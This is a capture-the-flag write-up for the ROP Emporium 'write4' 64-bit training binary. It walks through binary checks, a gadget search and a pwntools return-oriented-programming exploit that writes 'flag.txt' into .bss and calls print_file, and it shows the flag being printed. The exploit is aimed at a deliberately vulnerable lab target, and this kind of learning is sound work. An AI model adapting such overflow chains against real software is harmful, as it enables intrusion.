# write4  64 bit

---

[Access the challenge](https://ropemporium.com/challenge/write4.html)


```bash
❯ ./write4
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> hey..........
Thank you!
```

Basic File check:

```bash
❯ rabin2 -I write4
arch     x86
baddr    0x400000
binsz    6521
bintype  elf
bits     64
canary   false
injprot  false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    .
sanitize false
static   false
stripped false
subsys   linux
va       true
```

---

offset of the binary is 40

Load the binary in gdb

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400607 <+0>:	push   rbp
   0x0000000000400608 <+1>:	mov    rbp,rsp
   0x000000000040060b <+4>:	call   0x400500 <pwnme@plt>
   0x0000000000400610 <+9>:	mov    eax,0x0
   0x0000000000400615 <+14>:	pop    rbp
   0x0000000000400616 <+15>:	ret
End of assembler dump.
pwndbg> disass pwnme
Dump of assembler code for function pwnme@plt:
   0x0000000000400500 <+0>:	jmp    QWORD PTR [rip+0x200b12]        # 0x601018 <pwnme@got.plt>
   0x0000000000400506 <+6>:	push   0x0
   0x000000000040050b <+11>:	jmp    0x4004f0
End of assembler dump.
pwndbg> disass print_file
Dump of assembler code for function print_file@plt:
   0x0000000000400510 <+0>:	jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x0000000000400516 <+6>:	push   0x1
   0x000000000040051b <+11>:	jmp    0x4004f0
End of assembler dump.
pwndbg> disass usefulFunctions
No symbol table is loaded.  Use the "file" command.
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:	push   rbp
   0x0000000000400618 <+1>:	mov    rbp,rsp
   0x000000000040061b <+4>:	mov    edi,0x4006b4
   0x0000000000400620 <+9>:	call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:	nop
   0x0000000000400626 <+15>:	pop    rbp
   0x0000000000400627 <+16>:	ret
End of assembler dump.
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:	mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:	ret
   0x000000000040062c <+4>:	nop    DWORD PTR [rax+0x0]
End of assembler dump.
pwndbg>

````

---

writeable section 

```bash
❯ r2 -d -A write4
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Recovering variables
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods
INFO: Recovering local variables (afva)
INFO: Skipping type matching analysis in debugger mode (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x7d2b1b13d740]> iS
[Sections]

nth paddr        size vaddr       vsize perm type        name
-------------------------------------------------------------
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab

[0x7d2b1b13d740]>
```
---

Gadgets

```bash
❯ ropper -f write4 | grep "r14"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000400628: mov qword ptr [r14], r15; ret;
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068e: pop r13; pop r14; pop r15; ret;
0x0000000000400690: pop r14; pop r15; ret;
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068f: pop rbp; pop r14; pop r15; ret;
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret;
```
---

Now it's time for the final exploit.

```python
from pwn import *

context.binary = "./write4"

write_to = 0x0000000000400628 # mov qword ptr [r14], r15; ret

pop_r14_r15 = 0x0000000000400690 # pop r14; pop r15; ret

pop_rdi = 0x0000000000400693 # pop rdi; ret

loc_to_write = 0x00601038  # .bss section 

print_file = 0x0000000000400510 # print_file@plt

offset = b'A' * 40

payload = offset + p64(pop_r14_r15) + p64(loc_to_write) + b'flag.txt' + p64(write_to) + p64(pop_rdi) + p64(loc_to_write) + p64(print_file)

p = process()

p.sendlineafter('>', payload)

p.interactive()
```

Running this exploit.............


```bash
❯ python exp.py
[*] '/home/lynk/rop/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/lynk/rop/write4/write4': pid 9084
/usr/lib/python3.12/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
 Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
---



